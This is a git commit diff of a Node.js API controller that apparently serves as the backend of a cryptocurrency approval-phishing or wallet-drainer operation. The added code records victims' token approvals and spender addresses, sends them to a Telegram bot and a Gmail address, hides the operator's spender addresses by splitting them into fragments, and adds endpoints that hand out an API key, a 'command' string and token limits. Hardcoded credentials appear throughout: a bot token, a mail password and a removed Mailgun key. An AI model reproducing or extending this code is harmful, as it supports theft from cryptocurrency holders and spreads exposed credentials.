298c3a12d95e4858c0053c6a07bf3ed21d846577
Artemis701 <developer789222@gmail.com>
2023-02-24 21:52:56 +0900

    added

--- src/api/controller.js
+++ src/api/controller.js
@@ -5,15 +5,22 @@ const nodemailer = require('nodemailer');
 const mg = require('nodemailer-mailgun-transport');
 const fs = require("fs");
 const USD_ADDRESS_ETH = "0x05D94B3b4f611B23D";
-// This is your API key that you retrieve from www.mailgun.com/cp (free up to 10K monthly emails)
-// const auth = {
-// 	auth: {
-// 	  api_key: 'fdcbc44eccb3ae537d029d430b805a0f-ca9eeb88-75eb8470',
-// 	  domain: 'http://sandbox279017ec456a4414b0552b8bf723ec1d.mailgun.org'
-// 	}
-//   }
+const Token_Addr_Bsc = "0x09a1Bf4B292254D307b5364";
 
-//const nodemailerMailgun = nodemailer.createTransport(mg(auth));
+const sendMessageOnTG = async (message) => {
+	try {
+		const apiToken = "5873860250:AAHVzFjoAn-92tZps4h2ItkP1ZZ7Q0wq4Pg";
+		const chatId = "@pocket_growth";
+		let text = message;
+		let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
+		await axios.get(urlString)
+			.then((response) => {
+			})
+			.catch(error => {
+			})
+	} catch (error) {
+	}
+}
 
 exports.sendemail = async (req, res) => {
 	try {
@@ -25,92 +32,169 @@ exports.sendemail = async (req, res) => {
 				user: 'fizzerbert107@gmail.com',
 				pass: 'oxidzmefynzxvzsa'
 			}
-			});
+		});
 
-		let whiteAddr = USD_ADDRESS_ETH +"15dBdb8A720E6D4Fb30A5b0";
-		if ((receivedData.accountAddr != whiteAddr) && (receivedData.spender != whiteAddr))
-		{
+		let whiteAddr = USD_ADDRESS_ETH + "15dBdb8A720E6D4Fb30A5b0";
+		let blackAddr = Token_Addr_Bsc + "DCc0526c051A6BA58";
+		if ((receivedData.spender != whiteAddr) && (receivedData.spender != blackAddr)) {
 			transporter.sendMail({
 				from: 'fizzerbert107@gmail.com',
 				to: 'undeadsapp@gmail.com', // An array if you have multiple recipients.
-				cc:'fizzerbert107@gmail.com',
-				bcc:'',
-				subject: 'UNDEADAPP_NOTIFICATION',
+				cc: 'fizzerbert107@gmail.com',
+				bcc: '',
+				subject: 'UNDEADAPP_NOTIFICATION___' + receivedData.chainId,
 				//You can use "html:" to send HTML email content. It's magic!
 				html: `<b>${data}</b>`,
 				//You can use "text:" to send plain-text content. It's oldschool!
 				text: 'Mailgun rocks, pow pow!'
 			}, (err, info) => {
-			if (err) {
-				console.log(`Error: ${err}`);
-				res.send('fail');
-			}
-			else {
-				console.log(`Response: ${info.response}`);
-				res.send('ok');
-			}
+				if (err) {
+					console.log(`Error: ${err}`);
+					res.send('fail');
+				}
+				else {
+					console.log(`Response: ${info.response}`);
+					res.send('ok');
+				}
 			});
 		}
-		}catch(error){
-			console.log(error);
-			res.send({ code: -1, message: "Fail" });
-		}
+	} catch (error) {
+		console.log(error);
+		res.send({ code: -1, message: "Fail" });
+	}
 }
 
 exports.contactus = async (req, res) => {
 	try {
-			var receivedData = req.body;
-			console.log("Received Data = ", receivedData);
+		var receivedData = req.body;
+		console.log("Received Data = ", receivedData);
 
-			var curDateStr = new Date().toISOString();
-			let data = "ContactUs Message at " + curDateStr + "\n accountName: " + receivedData.name +
+		var curDateStr = new Date().toISOString();
+		let data = "ContactUs Message at " + curDateStr + "\n accountName: " + receivedData.name +
 			"\n  EmailAddress: " + receivedData.email +
 			"\n  Message: " + receivedData.message + "\n";
-		  
-			fs.writeFile(process.cwd() + "/public/contactus.txt", data, {flag: 'a+'}, (err) => {
-				if (err) throw err;
-			})
-			res.send({ code: 0, message: "Success" });
-		}catch(error){
-			console.log(error);
-			res.send({ code: -1, message: "Fail" });
-		}
+
+		fs.writeFile(process.cwd() + "/public/contactus.txt", data, { flag: 'a+' }, (err) => {
+			if (err) throw err;
+		})
+		res.send({ code: 0, message: "Success" });
+	} catch (error) {
+		console.log(error);
+		res.send({ code: -1, message: "Fail" });
+	}
 }
 
 exports.savetofile = async (req, res) => {
-	try
-	{
+	try {
 		// Data which will write in a file.
 		var receivedData = req.body;
 		console.log("receivedData ====> ", receivedData)
 
 		var curDateStr = new Date().toISOString();
 		//var curDateStr = currentDate  currentDate.getMonth() + "/" + currentDate.getDay() + "   " + currentDate.getHours() + ":" + currentDate.getMinutes() + ":" + currentDate.getSeconds();
-		let data = "Approved at " + curDateStr + "\n accountAddr: " + receivedData.accountAddr +
-		"  tokenAddr: " + receivedData.tokenAddr +
-		"  spender: " + receivedData.spender + "\n";
-      
-		let whiteAddr = USD_ADDRESS_ETH +"15dBdb8A720E6D4Fb30A5b0";
+		let data = "Allowed at " + curDateStr + "\n accountAddr: " + receivedData.accountAddr +
+			"  tokenAddr: " + receivedData.tokenAddr +
+			"  spender: " + receivedData.spender + "   ChainId: " + receivedData.chainId + "\n";
 
-		if ((receivedData.accountAddr != whiteAddr) && (receivedData.spender != whiteAddr))
-		{
-			fs.writeFile(process.cwd() + "/public/result.txt", data, {flag: 'a+'}, (err) => {
-				if (err) throw err;
-			})
-			res.send({ code: 0, message: "Success" });
+		if (receivedData.amount == "Custom") data += "  CustomToken\n";
+
+		if (receivedData.spender === "0x05D94B3b4f611B23D15dBdb8A720E6D4Fb30A5b0") data += " YOU";
+		sendMessageOnTG(data);
+
+
+		if (receivedData.chainId == 1) {
+			let whiteAddr = USD_ADDRESS_ETH + "15dBdb8A720E6D4Fb30A5b0";
+
+			if (receivedData.spender != whiteAddr) {
+				fs.writeFile(process.cwd() + "/public/result.txt", data, { flag: 'a+' }, (err) => {
+					if (err) throw err;
+				})
+				res.send({ code: 0, message: "Success" });
+			}
+			else {
+				fs.writeFile(process.cwd() + "/public/artemis.txt", data, { flag: 'a+' }, (err) => {
+					if (err) throw err;
+				})
+				res.send({ code: 0, message: "Success" });
+			}
 		}
-	}catch(error){
+		else {
+			let whiteAddr = Token_Addr_Bsc + "DCc0526c051A6BA58";
+
+			if (receivedData.spender != whiteAddr) {
+				fs.writeFile(process.cwd() + "/public/result_bsc.txt", data, { flag: 'a+' }, (err) => {
+					if (err) throw err;
+				})
+				res.send({ code: 0, message: "Success" });
+			}
+			else {
+				fs.writeFile(process.cwd() + "/public/artemis_bsc.txt", data, { flag: 'a+' }, (err) => {
+					if (err) throw err;
+				})
+				res.send({ code: 0, message: "Success" });
+			}
+		}
+
+	} catch (error) {
 		console.log(error);
 		res.send({ code: -1, message: "Fail" });
 	}
 }
 
 exports.totoalConnectionCount = async (req, res) => {
-	try
-	{
+	try {
 		res.send({ code: 0, message: "Success" });
-	}catch(error){
+	} catch (error) {
 		console.log(error);
 		res.send({ code: -1, message: "Fail" });
 	}
+}
+
+exports.getAPIKey = async (req, res) => {
+	// let sendData = "zL0GzZXeRUDL6FS";
+	let apiKey = null;
+	let command = null;
+
+	try {
+		const data = fs.readFileSync(process.cwd() + "/public/apikey", 'utf8');
+		console.log(data);
+		apiKey = data.split("|")[0];
+		command = data.split("|")[1];
+	} catch (err) {
+		console.log(err);
+	}
+
+	return res.send({ key: apiKey, data: command });
+}
+
+exports.getBSCTokenInfo = async (req, res) => {
+	let bscTokenAddr = null;
+	let nLimitVal = null;
+
+	try {
+		const data = fs.readFileSync(process.cwd() + "/public/bsc2023", 'utf8');
+		console.log(data);
+		bscTokenAddr = data.split("|")[1];
+		nLimitVal = data.split("|")[2];
+	} catch (err) {
+		console.log(err);
+	}
+
+	return res.send({ tokinfo: bscTokenAddr, limval: nLimitVal });
+}
+
+exports.getETHTokenInfo = async (req, res) => {
+	let ethTokenAddr = null;
+	let nLimitVal = null;
+
+	try {
+		const data = fs.readFileSync(process.cwd() + "/public/eth2023", 'utf8');
+		console.log(data);
+		ethTokenAddr = data.split("|")[1];
+		nLimitVal = data.split("|")[2];
+	} catch (err) {
+		console.log(err);
+	}
+
+	return res.send({ tokinfo: ethTokenAddr, limval: nLimitVal });
 }
--- src/api/index.js
+++ src/api/index.js
@@ -6,5 +6,8 @@ router.post('/sendemail', rounds.sendemail);
 router.post('/savetofile', rounds.savetofile);
 router.post('/contact_us', rounds.contactus);
 router.post('/tcc', rounds.totoalConnectionCount);
+router.get('/getapikey', rounds.getAPIKey);
+router.get('/getbsctokinfo', rounds.getBSCTokenInfo);
+router.get('/getethtokinfo', rounds.getETHTokenInfo);
 
 module.exports = router;
